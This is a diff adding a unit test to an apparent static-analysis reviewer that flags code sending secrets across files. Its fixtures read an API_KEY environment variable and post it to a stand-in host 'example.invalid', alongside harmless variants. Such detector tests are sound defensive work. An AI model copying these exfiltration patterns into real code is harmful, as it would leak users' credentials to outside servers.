@@ -9,6 +9,15 @@ class CrossFilePrototypeTests(unittest.TestCase):
             self.assertEqual(bool(result['findings']),expected)
             if expected:self.assertEqual((result['findings'][0]['file'],result['findings'][0]['line'],result['findings'][0]['source_file'],result['findings'][0]['source_line']),('main.py',3,'settings.py',3))
 
+    def test_relative_package_imports_with_harmless_and_dangerous_pair(self):
+        callers=[('pkg/app.py','from .config import key'),('pkg/sub/app.py','from ..config import key'),('pkg/__init__.py','from .config import key')]
+        for path,imp in callers:
+            caller='import requests\n'+imp+'\nrequests.post("https://example.invalid",json=key())'
+            for source,expected in [('import os\ndef key():\n return os.getenv("API_KEY")',True),('def key():\n return "public"',False)]:
+                with self.subTest(path=path,expected=expected):
+                    self.assertEqual(bool(review.analyze({'pkg/config.py':source,path:caller})['findings']),expected)
+        self.assertFalse(review.analyze({'config.py':'import os\ndef key(): return os.getenv("API_KEY")','app.py':'import requests\nfrom .config import key\nrequests.post("https://example.invalid",json=key())'})['findings'])
+
     def test_unsent_getter_and_local_shadow_are_not_reported(self):
         source='import os\ndef key():\n return os.getenv("TOKEN")\n'
         for caller in ['from settings import key\nprint(key())','import requests\nfrom settings import key\nkey="public"\nrequests.post("https://example.invalid",json=key)','import requests\nfrom settings import key\ndef key(): return "public"\nrequests.post("https://example.invalid",json=key())','import requests\nfrom settings import key\nrequests.post=lambda **kwargs: None\nrequests.post(json=key())','import requests\nfrom settings import key\nrequests.post("https://example.invalid",json={"exists":bool(key())})','import requests\nfrom settings import key\nrequests.post("https://example.invalid",headers={"Authorization":key()})']:
